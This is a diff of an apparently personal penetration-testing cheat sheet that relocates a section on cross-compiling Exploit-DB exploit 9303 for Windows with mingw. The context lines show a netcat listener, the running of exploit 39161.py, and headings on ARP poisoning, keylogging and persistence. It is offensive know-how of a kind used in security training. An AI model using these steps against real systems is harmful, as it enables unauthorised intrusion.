@@ -64,7 +64,7 @@ Ctrl + B 0 (1,2...) — Move to a specific window by number.
 - [ARP Poisoning](#ARP-Poisoning)
 - [BadBlue httpd 2.7](#BadBlue-httpd-27)
 - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
-- 
+- [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
 ## ARP Poisoning
 ```
@@ -101,6 +101,18 @@ nc -nvlp <port>
 python 39161.py <ip> <port>
 ```
 
+## Windows Cross-Compilation
+```
+sudo apt-get install mingw-w64 gcc
+```
+```
+searchsploit -m 9303
+
+i686-w64-mingw32-gcc 9303.c -o exploit
+i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
+```
+- Use 32-bit if unsure of target's architecture.
+
 # 3 Post-Exploitation
 - [Keylogging](#Keylogging)
 - [Cleanup Resource Scripts](#Cleanup-Resource-Scripts)
@@ -114,7 +126,6 @@ python 39161.py <ip> <port>
 - [SUID Binaries](#SUID-Binaries)
 - [Transfer Files](#Transfer-Files)
 - [Upgrade Shells](#Upgrade-Shells)
-- [Windows Cross-Compilation](#Windows-Cross-Compilation)
 - [Windows Local Enumeration](#Windows-Local-Enumeration)
 - [Windows Persistence Via RDP](#Windows-Persistence-Via-RDP)
 - [Windows Persistence Via Services](#Windows-Persistence-Via-Services)
@@ -357,18 +368,6 @@ set LHOST <ip>
 set SESSION <session_id>
 set WIN_TRANSFER VBS
 ```
-
-## Windows Cross-Compilation
-```
-sudo apt-get install mingw-w64 gcc
-```
-```
-searchsploit -m 9303
-
-i686-w64-mingw32-gcc 9303.c -o exploit
-i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
-```
-- Use 32-bit if unsure of target's architecture.
 
 ## Windows Local Enumeration
 - Enumerating System Information
